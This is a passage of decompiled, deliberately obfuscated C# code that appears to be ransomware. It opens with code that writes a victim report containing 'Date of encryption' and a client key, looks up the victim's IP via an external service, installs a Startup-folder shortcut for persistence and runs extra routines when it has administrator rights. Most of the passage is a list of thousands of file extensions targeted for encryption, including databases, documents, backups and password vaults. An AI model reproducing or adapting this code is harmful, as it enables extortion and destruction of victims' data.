            System.IO.File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), BErRpdYOfQAwSr.MwUDomDUGsVhYA), BErRpdYOfQAwSr.oMKRHTBqYRfOk("Q2xpZW50IElQOiA=") + new WebClient().DownloadString(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cDovL2ljYW5oYXppcC5jb20=")) + "\r\n" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + (object) DateTime.Now + "\r\n" + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + BErRpdYOfQAwSr.nFHjUKNuaEOj);
          else
            System.IO.File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), BErRpdYOfQAwSr.MwUDomDUGsVhYA), "\r\nAdditional KeyID: " + BErRpdYOfQAwSr.nFHjUKNuaEOj);
        }
        catch (Exception ex1)
        {
          if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
          {
            try
            {
              System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "Error while creating Local Report: " + ex1.Message + "\r\n");
            }
            catch (Exception ex2)
            {
            }
          }
        }
      }
      MfgvfCTaoTui.qVeMtrHnSvB(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), BErRpdYOfQAwSr.SGHDaCxgQr), BErRpdYOfQAwSr.WEEGseTDeH(BErRpdYOfQAwSr.nFHjUKNuaEOj), (string) null, (string) null, "Installer...", "Ctrl+Shift+X", (string) null);
      if (BErRpdYOfQAwSr.TTjoQWzJaWoUj == "YES")
      {
        try
        {
          BErRpdYOfQAwSr.qBOJnbpOcHbwx();
        }
        catch
        {
        }
      }
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        BErRpdYOfQAwSr.esQslEvKNI();
      try
      {
        BErRpdYOfQAwSr.SPaVkRNulTSot(new string[1]
        {
          "[auto]"
        }, new string[4741]
        {
          "db",
          "dbf",
          "accdb",
          "dbx",
          "mdb",
          "mdf",
          "epf",
          "ndf",
          "ldf",
          "1cd",
          "sdf",
          "nsf",
          "fp7",
          "cat",
          "log",
          "$$$",
          "$db",
          "$efs",
          "$er",
          "^^^",
          "__a",
          "__b",
          "{pb",
          "~cw",
          "~hm",
          "0",
          "000",
          "001",
          "1",
          "101",
          "103",
          "108",
          "110",
          "113",
          "123",
          "128",
          "17t",
          "1CD",
          "1pe",
          "1ph",
          "1sp",
          "1st",
          "2",
          "2mg",
          "2Q0",
          "2QM",
          "3",
          "3d",
          "3d4",
          "3dd",
          "3df",
          "3df8",
          "3dm",
          "3dmdef",
          "3dp",
          "3dr",
          "3ds",
          "3dt",
          "3dw",
          "3dxml",
          "3fr",
          "3g2",
          "3ga",
          "3gp",
          "3gp2",
          "3me",
          "3MF",
          "3mm",
          "3pe",
          "3pr",
          "3w",
          "4dd",
          "4dl",
          "4dv",
          "4fs",
          "4w7",
          "5vw",
          "602",
          "73b",
          "73c",
          "73l",
          "7z",
          "7z001",
          "7z002",
          "7zip",
          "8",
          "86f",
          "89t",
          "89y",
          "8ba",
          "8bc",
          "8be",
          "8bf",
          "8bi8",
          "8bl",
          "8bs",
          "8bx",
          "8by",
          "8li",
          "8svx",
          "8xg",
          "8xk",
          "8xs",
          "8xt",
          "8xv",
          "9xt",
          "9xy",
          "a$v",
          "a00",
          "a01",
          "a02",
          "a2c",
          "a5l",
          "a5w",
          "a65",
          "aa",
          "aa3",
          "aac",
          "aaf",
          "aah",
          "aam",
          "aao",
          "aaui",
          "ab",
          "ab1",
          "ab3",
          "ab4",
          "ab65",
          "aba",
          "abbu",
          "abc",
          "abcd",
          "abf",
          "abi",
          "abk",
          "abkprj",
          "abp",
          "abt",
          "abw",
          "aby",
          "ac2",
          "ac3",
          "ac5",
          "aca",
          "acc",
          "accdc",
          "accde",
          "accdr",
          "accdt",
          "accft",
          "ACCTB",
          "ace",
          "acf",
          "acg",
          "ach",
          "ACL",
          "acp",
          "acq",
          "acr",
          "acrobatsecuritysettings",
          "acrodata",
          "acroplugin",
          "acrypt",
          "act",
          "acz",
          "ad",
          "ada",
          "adb",
          "adc",
          "adcp",
          "add",
          "addism",
          "ade",
          "adf",
          "adi",
          "adif",
          "adoc",
          "ados",
          "adox",
          "adp",
          "adpb",
          "adr",
          "ads",
          "adt",
          "adu",
          "adv",
          "advs",
          "adx",
          "adz",
          "aea",
          "aec",
          "aep",
          "aepx",
          "aes",
          "aet",
          "afd",
          "afdesign",
          "afe",
          "aff",
          "afi",
          "afm",
          "afp",
          "aft",
          "agd",
          "agd1",
          "agdl",
          "age3rec",
          "age3sav",
          "age3scn",
          "age3xrec",
          "age3xsav",
          "age3xscn",
          "age3yrec",
          "age3ysav",
          "age3yscn",
          "aggr",
          "ahf",
          "ai",
          "aif",
          "aifb",
          "aiff",
          "aim",
          "ain",
          "AIO",
          "aip",
          "ais",
          "ait",
          "ak",
          "al",
          "al8",
          "ala",
          "alb3",
          "alb4",
          "alb5",
          "alb6",
          "alc",
          "ald",
          "aldf",
          "alf",
          "ali",
          "allet",
          "alt3",
          "alt5",
          "alz",
          "AM",
          "amb",
          "amc",
          "amf",
          "aml",
          "amm",
          "amr",
          "amsorm",
          "amt",
          "amu",
          "amx",
          "amxx",
          "an1",
          "an8",
          "anime",
          "anl",
          "anme",
          "ann",
          "ans",
          "ansr",
          "ansym",
          "anx",
          "aoi",
          "ap",
          "apa",
          "apalbum",
          "apd",
          "ape",
          "apf",
          "aph",
          "api",
          "apj",
          "apk",
          "aplibrary",
          "apnx",
          "apo",
          "app",
          "APPCACHE",
          "approj",
          "APPX",
          "apr",
          "apt",
          "apw",
          "apxl",
          "apz",
          "ar",
          "arc",
          "arch00",
          "archiver",
          "arduboy",
          "arff",
          "ari",
          "arj",
          "arn",
          "aro",
          "arr",
          "ars",
          "art",
          "arw",
          "as",
          "as$",
          "as3",
          "asa",
          "asc",
          "ascm",
          "ascx",
          "asd",
          "ase",
          "asf",
          "ashbak",
          "ashdisc",
          "ashprj",
          "ashx",
          "ask",
          "asl",
          "asm",
          "asmx",
          "asn",
          "asnd",
          "asp",
          "aspx",
          "asr",
          "asset",
          "ast",
          "asv",
          "asvx",
          "asx",
          "atf",
          "ath",
          "atl",
          "atomsvc",
          "atr",
          "ats",
          "atw",
          "automaticdestinations-ms",
          "aux",
          "av",
          "avc",
          "avhd",
          "avhdx",
          "avj",
          "avl",
          "avn",
          "avp",
          "avs",
          "AW",
          "awb",
          "awbr",
          "awd",
          "awdb",
          "awe",
          "awg",
          "awp",
          "aws",
          "awt",
          "aww",
          "awwp",
          "ax",
          "azf",
          "azs",
          "azw",
          "azw1",
          "azw3",
          "azw4",
          "azz",
          "azzx",
          "b",
          "b1",
          "b27",
          "b2a",
          "b5i",
          "b5t",
          "b64",
          "b6i",
          "b6t",
          "b6z",
          "ba",
          "ba6",
          "ba7",
          "ba8",
          "ba9",
          "bac",
          "back",
          "backup",
          "backupdb",
          "bad",
          "bafl",
          "bak",
          "bak~",
          "bak2",
          "bak3",
          "bakx",
          "bamboopaper",
          "bank",
          "bar",
          "baserproj",
          "bau",
          "bax",
          "bay",
          "bbb",
          "bbcd",
          "bbl",
          "bbprojectd",
          "bbs",
          "bbxt",
          "bbz",
          "bc",
          "bc5",
          "bc6",
          "bc7",
          "bcc",
          "bcd",
          "bci",
          "bck",
          "bckp",
          "bcl",
          "bcm",
          "bcp",
          "bct",
          "bdb",
          "bdb2",
          "bdc",
          "bdf",
          "bdic",
          "bdoc",
          "bdp",
          "bdr",
          "bdt2",
          "bdt3",
          "bean",
          "bed",
          "bfa",
          "bff",
          "bfx",
          "bgl",
          "bgt",
          "bgv",
          "bh",
          "bho",
          "bi8",
          "bib",
          "bibtex",
          "bic",
          "bif",
          "bifx",
          "big",
          "bik",
          "bil",
          "bim",
          "bin",
          "bina",
          "binary",
          "bionix",
          "BIT",
          "bizdocument",
          "bjl",
          "bjo",
          "bk",
          "bk!",
          "bk1",
          "bk2",
          "bk3",
          "bk4",
          "bk5",
          "bk6",
          "bk7",
          "bk8",
          "bk9",
          "bkc",
          "bkf",
          "bkg",
          "bkp",
          "bks",
          "bkup",
          "bkz",
          "blb",
          "bld",
          "blend",
          "blend1",
          "blend2",
          "blg",
          "blk",
          "blm",
          "bln",
          "blob",
          "blockplt",
          "blogthis",
          "blp",
          "bluebutton",
          "bm2",
          "bm3",
          "bmc",
          "bmf",
          "bmk",
          "bml",
          "bmm",
          "bmml",
          "bmpr",
          "bms",
          "bna",
          "bndl",
          "bnk",
          "boc",
          "bok",
          "boo",
          "book",
          "bookexport",
          "bop",
          "box",
          "bp1",
          "bp2",
          "bp3",
          "bpa",
          "bpb",
          "bpd",
          "bpdx",
          "bpf",
          "bphys",
          "bpj",
          "bpk",
          "bpl",
          "bplx",
          "bpm",
          "bpmc",
          "bpn",
          "bps",
          "bpw",
          "brain",
          "brd",
          "breaking_bad",
          "brf",
          "brh",
          "brl",
          "brn",
          "BROWSER",
          "brs",
          "brw",
          "brx",
          "bsa",
          "bsd",
          "bsdl",
          "bsk",
          "bso",
          "bsp",
          "bst",
          "btd",
          "btf",
          "btif",
          "btinstall",
          "BTL",
          "btm",
          "btoa",
          "btr",
          "btx",
          "BUD",
          "bul",
          "bundle",
          "bup",
          "burn",
          "burntheme",
          "bvd",
          "bvp",
          "bwa",
          "bwd",
          "bwf",
          "bwi",
          "bwp",
          "bws",
          "bwt",
          "bwz",
          "BXF",
          "bxx",
          "bz",
          "bz2",
          "bza",
          "bzabw",
          "bzip",
          "bzip2",
          "c",
          "c00",
          "c01",
          "c02",
          "c10",
          "c2e",
          "c3d",
          "c4p",
          "c6",
          "cadoc",
          "cae",
          "caf",
          "cag",
          "calca",
          "cam",
          "camm",
          "camproj",
          "cap",
          "capt",
          "capx",
          "car",
          "caro",
          "cas",
          "catproduct",
          "cav",
          "cawr",
          "cb7",
          "cba",
          "cbf",
          "cbg",
          "cbmap",
          "cbor",
          "cbr",
          "cbs",
          "cbt",
          "cbu",
          "cbz",
          "cc",
          "cca",
          "ccc",
          "ccd",
          "ccf",
          "cch",
          "ccitt",
          "ccld",
          "ccp",
          "cct",
          "cd",
          "cd1",
          "cd2",
          "cdb",
          "cdc",
          "cdd",
          "cddz",
          "cdf",
          "cdi",
          "cdk",
          "cdl",
          "cdm",
          "cdml",
          "cdmm",
          "cdmz",
          "cdp",
          "cdpz",
          "cdr",
          "cdr3",
          "cdr4",
          "cdr5",
          "cdr6",
          "cdrw",
          "cds",
          "cdt",
          "cdtx",
          "cdx",
          "cdxml",
          "ce1",
          "ce2",
          "cef",
          "cel",
          "celtx",
          "cenon~",
          "cer",
          "cert",
          "cf",
          "cf5",
          "cfa",
          "cfb",
          "cfd",
          "cfg",
          "cfp",
          "cfr",
          "cfs",
          "cfx",
          "cgf",
          "cgfiletypetest",
          "cgi",
          "cgm",
          "cgp",
          "chg",
          "chi",
          "chk",
          "chm",
          "chml",
          "chmprj",
          "chp",
          "chpscrap",
          "CHR",
          "cht",
          "chtml",
          "cib",
          "cida",
          "cif",
          "cipo",
          "circ",
          "ciso",
          "civ4worldbuildersave",
          "civbeyondswordsave",
          "ck9",
          "ckp",
          "ckt",
          "cl2",
          "cl2arc",
          "cl2doc",
          "cl5",
          "clam",
          "clarify",
          "class",
          "classlist",
          "clb",
          "cld",
          "clg",
          "clix",
          "clk",
          "clkd",
          "clkm",
          "clks",
          "clkt",
          "clktk",
          "clkv",
          "clm",
          "clp",
          "clr",
          "cls",
          "clx",
          "cm10",
          "cm5",
          "cma",
          "cmap",
          "CMB",
          "cmbl",
          "cmf",
          "cml",
          "cmp",
          "cmr",
          "cms",
          "cmt",
          "cmu",
          "cna",
          "cnf",
          "cng",
          "cnt",
          "cnv",
          "cod",
          "col",
          "collab",
          "comicdoc",
          "comiclife",
          "COMMENTS",
          "compositionmodel",
          "compositiontemplate",
          "con",
          "conf",
          "config",
          "contact",
          "converterx",
          "cp",
          "cp9",
          "CPA",
          "cpaa",
          "cpc",
          "cpd",
          "cpdt",
          "cpf",
          "cpgz",
          "cphd",
          "cpi",
          "cpio",
          "cpk",
          "cpmz",
          "cpp",
          "cpt",
          "cptx",
          "cpy",
          "cr2",
          "cram",
          "crashed",
          "craw",
          "crb",
          "crd",
          "crds",
          "creole",
          "crev",
          "cri",
          "crjoker",
          "crs",
          "crs3",
          "crt",
          "crtr",
          "crtx",
          "crw",
          "crwl",
          "cry",
          "crypt",
          "crypt12",
          "crypt8",
          "crypt9",
          "crypted",
          "cryptowall",
          "cryptra",
          "cs",
          "cs8",
          "csa",
          "csd",
          "cse",
          "CSG",
          "csh",
          "csi",
          "csl",
          "csm",
          "cso",
          "csp",
          "csr",
          "css",
          "cst",
          "csv",
          "ctb",
          "ctbl",
          "ctd",
          "cte",
          "ctf",
          "CTG",
          "ctl",
          "ctm",
          "ctp",
          "ctproject",
          "ctt",
          "ctv",
          "ctv3",
          "ctx",
          "ctxt",
          "cty",
          "cub",
          "cube",
          "cue",
          "current",
          "cursorfx",
          "curxptheme",
          "cva",
          "cvd",
          "cvj",
          "cvl",
          "cvn",
          "cvw",
          "cw3",
          "cwf",
          "cwk",
          "cwn",
          "cwr",
          "cws",
          "cww",
          "cwwp",
          "cxa",
          "cxarchive",
          "cxd",
          "cxf",
          "cxr",
          "cxt",
          "cyi",
          "cyo",
          "cys",
          "czi",
          "czip",
          "czp",
          "d",
          "d00",
          "d01",
          "d3dbsp",
          "d64",
          "d88",
          "da0",
          "da2",
          "daa",
          "dac",
          "dacpac",
          "dad",
          "dadiagrams",
          "dadx",
          "daf",
          "dag",
          "dal",
          "dam",
          "dao",
          "dap",
          "dar",
          "das",
          "daschema",
          "dash",
          "dat",
          "DATA",
          "database",
          "datx",
          "dax",
          "dayzprofile",
          "dazip",
          "db_journal",
          "db0",
          "db3",
          "dba",
          "dbb",
          "dbc",
          "dbcrypt12",
          "dbcrypt8",
          "dbd",
          "DBF",
          "dbfv",
          "dbgsym",
          "db-journal",
          "dbk",
          "dbr",
          "dbs",
          "db-shm",
          "dbt",
          "dbv",
          "db-wal",
          "dc2",
          "dc4",
          "dca",
          "dcb",
          "dcd",
          "dcf",
          "dch",
          "dcl",
          "dcm",
          "dcmd",
          "dcmf",
          "dco",
          "dcp",
          "dcpf",
          "dcpr",
          "dcr",
          "dcs",
          "dct",
          "dct5",
          "dcu",
          "dcx",
          "dd",
          "ddb",
          "ddc",
          "ddcx",
          "ddd",
          "ddf",
          "ddif",
          "ddl",
          "ddoc",
          "ddrw",
          "dds",
          "ddt",
          "deb",
          "debian",
          "dec",
          "ded",
          "def",
          "default",
          "del",
          "dem",
          "DEP",
          "deproj",
          "der",
          "des",
          "desc",
          "description",
          "design",
          "desklink",
          "det",
          "deu",
          "dev",
          "develve",
          "deviceinfo",
          "dex",
          "dfe",
          "dfl",
          "dfm",
          "dfproj",
          "dft",
          "dfti",
          "dgc",
          "dgm",
          "DGML",
          "dgpd",
          "dgr",
          "dgrh",
          "dgs",
          "dhcd",
          "dhe",
          "dia",
          "dic",
          "dict",
          "did",
          "dif",
          "dig",
          "dii",
          "dim",
          "dime",
          "dip",
          "dir",
          "directory",
          "disc",
          "disco",
          "disk",
          "dist",
          "dit",
          "dita",
          "ditamap",
          "ditaval",
          "divx",
          "diz",
          "djbz",
          "djv",
          "djvu",
          "dk@p",
          "dkt",
          "dl",
          "dl_",
          "dlc",
          "dlg",
          "dlis",
          "dlt",
          "dltemp",
          "dm2",
          "dmbk",
          "dmc",
          "dmg",
          "dmgpart",
          "dmm",
          "dmmx",
          "dmo",
          "dmp",
          "dmpr",
          "dmr",
          "dms",
          "dmsp",
          "dmtemplate",
          "dmv",
          "dna",
          "dng",
          "dnl",
          "dob",
          "doc",
          "doc#",
          "docb",
          "doce",
          "docenx",
          "dochtml",
          "dockzip",
          "docl",
          "docm",
          "docmhtml",
          "docs",
          "docset",
          "docstates",
          "doct",
          "documentrevisions-v100",
          "docx",
          "docxl",
          "docxml",
          "dok",
          "dot",
          "dothtml",
          "dotm",
          "dotmenx",
          "dotx",
          "dotxenx",
          "dox",
          "doxy",
          "doz",
          "dp",
          "dp1",
          "dpb",
          "DPC",
          "dpd",
          "dpi",
          "dpk",
          "dpl",
          "dpn",
          "dpr",
          "dps",
          "dpt",
          "dpx",
          "dqy",
          "dr",
          "drd",
          "dream",
          "drf",
          "drl",
          "drm",
          "drmx",
          "drmz",
          "drscan",
          "drw",
          "dsb",
          "dsc",
          "dsd",
          "dsdic",
          "dsf",
          "dsg",
          "dsk",
          "dsl",
          "dsn",
          "dsp",
          "dss",
          "dsx",
          "dsy",
          "dsz",
          "dt",
          "dta",
          "dtd",
          "dtm",
          "dtml",
          "dtp",
          "dtr",
          "dtsx",
          "dtx",
          "dump",
          "dupeguru",
          "dvb",
          "dvc",
          "dvd",
          "dvdproj",
          "dvds",
          "dvi",
          "dvo",
          "dvs",
          "dvx",
          "dvz",
          "dwd",
          "dwdoc",
          "dwf",
          "dwfx",
          "dwg",
          "dwi",
          "dwlibrary",
          "dwp",
          "dws",
          "dwt",
          "dxb",
          "dxd",
          "dxe",
          "dxf",
          "dxg",
          "dxl",
          "dxn",
          "dxp",
          "dxr",
          "dxstudio",
          "dz",
          "dzp",
          "e01",
          "e2p",
          "e3s",
          "e4a",
          "eap",
          "eas",
          "easmx",
          "ebk",
          "ebm",
          "ebs",
          "ebuild",
          "ec0",
          "ec3",
          "ec4",
          "ecc",
          "ecl",
          "ecm",
          "eco",
          "ecr",
          "ecs",
          "ecsbx",
          "ect",
          "ecx",
          "eda",
          "edat",
          "edat2",
          "edb",
          "edd",
          "ede",
          "edf",
          "edfx",
          "edg",
          "edi",
          "edk",
          "edl",
          "edml",
          "edn",
          "edoc",
          "edq",
          "edrwx",
          "eds",
          "edt",
          "edv",
          "edz",
          "eep",
          "ef",
          "efa",
          "efax",
          "eff",
          "efl",
          "efm",
          "efp",
          "efr",
          "eftx",
          "efu",
          "efw",
          "efx",
          "egg",
          "eglib",
          "egp",
          "egr",
          "egt",
          "ehp",
          "eif",
          "eip",
          "ekb",
          "ekm",
          "el6",
          "eld",
          "elf",
          "elfo",
          "eln",
          "els",
          "em",
          "emb",
          "embl",
          "emc",
          "emd",
          "emf",
          "eml",
          "emlxpart",
          "emm",
          "emrg",
          "emrg2",
          "enc",
          "enciphered",
          "encrypted",
          "enex",
          "enfpack",
          "enl",
          "enlx",
          "enq",
          "ent",
          "env",
          "enw",
          "enx",
          "enyd",
          "eob",
          "eot",
          "ep",
          "epdf",
          "EPF",
          "epi",
          "epim",
          "epk",
          "epp",
          "eprtx",
          "eps",
          "epsf",
          "ept",
          "epub",
          "epw",
          "eql",
          "er1",
          "erbsql",
          "erd",
          "ere",
          "erf",
          "erg",
          "erp",
          "err",
          "ersx",
          "es",
          "es2",
          "es3",
          "esb",
          "esc",
          "esd",
          "ese",
          "esf",
          "esm",
          "esp",
          "esq",
          "ess",
          "est",
          "esv",
          "esx",
          "et",
          "ete",
          "etng",
          "etnt",
          "ets",
          "ett",
          "etx",
          "euc",
          "eui",
          "ev",
          "EV1",
          "EV2",
          "EV3",
          "ev3p",
          "ev3s",
          "evo",
          "evx",
          "evy",
          "ewl",
          "ews",
          "ex",
          "ex01",
          "exb",
          "exc",
          "exd",
          "exf",
          "exif",
          "exl",
          "exm",
          "exp",
          "exprwdhtml",
          "exprwdxml",
          "exx",
          "ez",
          "ezc",
          "ezm",
          "ezs",
          "ezz",
          "f",
          "f04",
          "f06",
          "f3z",
          "f4v",
          "f90",
          "f96",
          "fa",
          "fac",
          "fadein",
          "fae",
          "familyfile",
          "faq",
          "far",
          "fas",
          "fasta",
          "fax",
          "fbc",
          "fbd",
          "fbf",
          "fbk",
          "fbp6",
          "fbq",
          "fbs",
          "fbu",
          "fbw",
          "fcd",
          "fcf",
          "fcpbundle",
          "fcpevent",
          "fcpproject",
          "fcpxdest",
          "fcpxml",
          "fcs",
          "fcstd",
          "fct",
          "fd",
          "fdb",
          "fdd",
          "fdf",
          "fdi",
          "fdm",
          "fdoc",
          "fdp",
          "fdr",
          "fds",
          "fdseq",
          "fdt",
          "fdw",
          "fdx",
          "FE",
          "fed",
          "feed-ms",
          "feedsdb-ms",
          "fes",
          "ff",
          "ffa",
          "ffd",
          "ffdata",
          "fff",
          "ffindex",
          "ffl",
          "ffo",
          "fft",
          "ffwp",
          "ffx",
          "fg3",
          "fh",
          "fhc",
          "fhd",
          "fhf",
          "fic",
          "fid",
          "fig",
          "fil",
          "fin",
          "fingnet",
          "fl",
          "fla",
          "flac",
          "flag",
          "flam3",
          "flame",
          "flat",
          "flf",
          "flg",
          "flib",
          "flipchart",
          "flk",
          "flka",
          "flkb",
          "fll",
          "flm",
          "flo",
          "flow",
          "flp",
          "fls",
          "flt",
          "fltr",
          "flv",
          "flvv",
          "flwa",
          "fly",
          "fm",
          "fm3",
          "fmat",
          "fmc",
          "fmd",
          "fmf",
          "fml",
          "fmp",
          "fmp12",
          "fmp3",
          "fmpsl",
          "fmt",
          "fnbk",
          "fnf",
          "fnm",
          "fnrecipes",
          "fo",
          "fob",
          "fodg",
          "fodp",
          "fods",
          "fodt",
          "fol",
          "folio",
          "folx",
          "fop",
          "for",
          "forge",
          "fos",
          "fountain",
          "fox",
          "fp",
          "fp3",
          "fp4",
          "fp5",
          "fp8",
          "fpa",
          "fpage",
          "fpdoclib",
          "fpenc",
          "fphomeop",
          "fpk",
          "fplinkbar",
          "fpp",
          "fpr",
          "fpsl",
          "fpsx",
          "fpt",
          "fpx",
          "fqc",
          "fra",
          "frag",
          "frameset",
          "frd",
          "frdat",
          "frdoc",
          "freepp",
          "frelf",
          "frl",
          "frm",
          "fro",
          "fs",
          "fsa",
          "fsc",
          "fsd",
          "fsf",
          "fsh",
          "fsif",
          "fsp",
          "fss",
          "fstab",
          "ft10",
          "ft11",
          "ft7",
          "ft8",
          "ft9",
          "ftil",
          "ftl",
          "ftm",
          "ftmb",
          "ftr",
          "ftw",
          "ful",
          "fwbackup",
          "fwdict",
          "fwk",
          "fwtemplate",
          "FX",
          "fxd",
          "fxf",
          "fxg",
          "fxo",
          "fxp",
          "fxr",
          "fza",
          "fzb",
          "fzbz",
          "fzh",
          "fzip",
          "fzpz",
          "g1m",
          "g3m",
          "g41",
          "ga3",
          "gadgeprj",
          "gal",
          "gallery",
          "gam",
          "gan",
          "gar",
          "gb",
          "gb1",
          "gb2",
          "gbi",
          "gbk",
          "gbl",
          "gbo",
          "gbp",
          "gbr",
          "gbs",
          "gc",
          "gca",
          "gcd",
          "gcg",
          "gcproj",
          "gcsx",
          "gct",
          "gcw",
          "gcx",
          "gd3",
          "gdb",
          "gdbtable",
          "gdc",
          "gdf",
          "GDL",
          "gdoc",
          "gdrive",
          "gdt",
          "gdtb",
          "ged",
          "gedata",
          "gedcom",
          "gen",
          "genbank",
          "geo",
          "gev",
          "gevl",
          "gexf",
          "gfe",
          "gfi",
          "gform",
          "gfs",
          "gfx",
          "ggb",
          "ghe",
          "gho",
          "ghs",
          "gi",
          "gil",
          "gis",
          "giw",
          "gkh",
          "gla",
          "gld",
          "glink",
          "glk",
          "glo",
          "glos",
          "gls",
          "gly",
          "gmap",
          "gmbl",
          "gml",
          "gmp",
          "gms",
          "gmz",
          "gnd",
          "gno",
          "gnp",
          "gnutar",
          "gofin",
          "gp3",
          "gp4",
          "gpd",
          "gpf",
          "gpg",
          "gpi",
          "gpj",
          "gpn",
          "gpp",
          "gpr",
          "gpscan",
          "gpx",
          "gpz",
          "gra",
          "grade",
          "graphml",
          "graphmlz",
          "gray",
          "grd",
          "grdb",
          "grey",
          "grf",
          "grib",
          "grib2",
          "grind",
          "grindx",
          "grk",
          "grle",
          "groups",
          "grp",
          "grr",
          "grs",
          "grt",
          "grv",
          "GRXML",
          "gry",
          "gs",
          "gsa",
          "gs-bck",
          "gsf",
          "gsheet",
          "gslides",
          "gsm",
          "GTA",
          "gtable",
          "gtar",
          "gthr",
          "gtl",
          "gtm",
          "gto",
          "gtp",
          "gts",
          "gui",
          "guides",
          "gul",
          "gvi",
          "gwi",
          "gwk",
          "gwp",
          "gxk",
          "gxl",
          "gxt",
          "gz",
          "gz2",
          "gza",
          "gzi",
          "gzig",
          "gzip",
          "h",
          "h10",
          "h11",
          "h12",
          "h13",
          "h14",
          "h15",
          "h16",
          "h17",
          "h1q",
          "h1s",
          "h1w",
          "h2o",
          "h2w",
          "h3m",
          "h4",
          "h4r",
          "h5",
          "h6x",
          "h77t",
          "haas",
          "hal",
          "haml",
          "hbk",
          "hbl",
          "hbx",
          "hc",
          "hcc",
          "hce",
          "hci",
          "hcl",
          "HCP",
          "hcr",
          "hcu",
          "hcw",
          "hcx",
          "hcxs",
          "hda",
          "hdb",
          "hdd",
          "hdf",
          "hdi",
          "hdl",
          "hdpmx",
          "hds",
          "hdt",
          "hdumx",
          "hdx",
          "hed",
          "help",
          "helpindex",
          "HEQ",
          "hex",
          "hfd",
          "hfs",
          "hft",
          "hfv",
          "hhs",
          "hif",
          "hin",
          "his",
          "hjt",
          "hkdb",
          "HKF",
          "hkx",
          "hl",
          "hlf",
          "hlp",
          "hlx",
          "hlx2",
          "hlz",
          "hm2",
          "hm3",
          "hml",
          "hmskin",
          "hmt",
          "hmxp",
          "hmxz",
          "hnd",
          "hoi4",
          "hol",
          "hot",
          "hp2",
          "hpd",
          "hpj",
          "hplg",
          "hpo",
          "hpp",
          "hps",
          "hpt",
          "hpw",
          "hqx",
          "hrx",
          "hs",
          "hs2",
          "hsdt",
          "hsk",
          "hsm",
          "hst",
          "hsx",
          "hta",
          "htb",
          "htg",
          "htm",
          "htm~",
          "html",
          "htmls",
          "htmlz",
          "htms",
          "htpasswd",
          "htz5",
          "huh",
          "hvc",
          "HVE",
          "hvpl",
          "hw3",
          "hwp",
          "hwpml",
          "hwt",
          "hxe",
          "hxi",
          "HXL",
          "HXN",
          "hxq",
          "hxr",
          "hxs",
          "HXX",
          "hyp",
          "hype",
          "hyv",
          "i00",
          "i01",
          "i02",
          "i5z",
          "iab",
          "iaf",
          "ial",
          "ias",
          "ib",
          "iba",
          "ibadr",
          "ibank",
          "ibb",
          "ibcd",
          "ibd",
          "ibdat",
          "ibg",
          "ibk",
          "ibp",
          "ibq",
          "ibz",
          "icalevent",
          "icaltodo",
          "icbu",
          "icc",
          "icf",
          "icg",
          "ichat",
          "icml",
          "icmt",
          "ico",
          "icr",
          "ics",
          "icst",
          "icxs",
          "id2",
          "id3tag",
          "idap",
          "idb",
          "idc",
          "idd",
          "idl",
          "idml",
          "idp",
          "idx",
          "ie5",
          "ie6",
          "ie7",
          "ie8",
          "ie9",
          "ies",
          "ifaith",
          "iff",
          "ifiction",
          "ifm",
          "ifp",
          "ifs",
          "igc",
          "igg",
          "igma",
          "ign",
          "igq",
          "igr",
          "ihf",
          "ihp",
          "ihx",
          "ii",
          "iif",
          "iiq",
          "iks",
          "ila",
          "ildoc",
          "ilg",
          "ilogicvb",
          "ima",
          "image",
          "imd",
          "img",
          "imp",
          "imr",
          "imt",
          "imz",
          "in",
          "INBOX",
          "INC",
          "incp",
          "incpas",
          "ind",
          "indb",
          "indd",
          "INDEX",
          "indl",
          "indp",
          "indt",
          "inf",
          "info",
          "ink",
          "inld",
          "inlk",
          "inp",
          "inprogress",
          "inrs",
          "ins",
          "inss",
          "installhelper",
          "insx",
          "internetconnect",
          "inx",
          "ioca",
          "iof",
          "ip",
          "ipa",
          "ipalias",
          "ipd",
          "ipf",
          "iphoto",
          "iplb",
          "ipmeta",
          "ipr",
          "iproject",
          "iq4",
          "iqmol",
          "irock",
          "irp",
          "irr",
          "irx",
          "is1",
          "is2",
          "isf",
          "ish1",
          "ish2",
          "ish3",
          "iso",
          "ispc",
          "ispx",
          "ist",
          "isu",
          "isz",
          "itdb",
          "ite",
          "itl",
          "itlp",
          "itm",
          "itmsp",
          "itmz",
          "itn",
          "itp",
          "its",
          "itw",
          "itx",
          "iup",
          "iv2i",
          "ivc",
          "ivd",
          "ivs",
          "ivt",
          "iw",
          "iw44",
          "iwa",
          "iwd",
          "iwi",
          "iwm",
          "iwprj",
          "iwtpl",
          "iwxdata",
          "ix",
          "ix2",
          "ixa",
          "ixb",
          "ixv",
          "j01",
          "jac",
          "jar",
          "jasper",
          "jav",
          "java",
          "jb2",
          "jbc",
          "jbi",
          "jbig",
          "jbig2",
          "jbk",
          "jbr",
          "jc",
          "jclic",
          "JCP",
          "jdat",
          "jdb",
          "jdc",
          "jdd",
          "jef",
          "jet",
          "jfif",
          "JFM",
          "jgcscs",
          "jge",
          "jgz",
          "jhd",
          "jiaf",
          "jias",
          "jif",
          "jiff",
          "jmp",
          "jnb",
          "jnt",
          "joboptions",
          "joe",
          "joined",
          "jp1",
          "jpa",
          "jpc",
          "jpe",
          "jpeg",
          "jpf",
          "jpg",
          "jpgx",
          "jph",
          "jpm",
          "jps",
          "jpw",
          "jrf",
          "jrl",
          "jrprint",
          "JRS",
          "jrxml",
          "js",
          "JS1",
          "jsd",
          "jsda",
          "json",
          "jsp",
          "jspa",
          "jspx",
          "jtbackup",
          "jtd",
          "jtdc",
          "jtt",
          "JTX",
          "jude",
          "just",
          "jw",
          "jwl",
          "jww",
          "k25",
          "k3b",
          "kal",
          "kap",
          "kb2",
          "kbd",
          "kbf",
          "kbits",
          "kbs",
          "kc2",
          "kdb",
          "kdbx",
          "kdc",
          "kde",
          "kdf",
          "kdz",
          "keb",
          "kelgfile",
          "kes",
          "kexi",
          "kexic",
          "kexis",
          "key",
          "keychain",
          "keynote",
          "keytab",
          "key-tef",
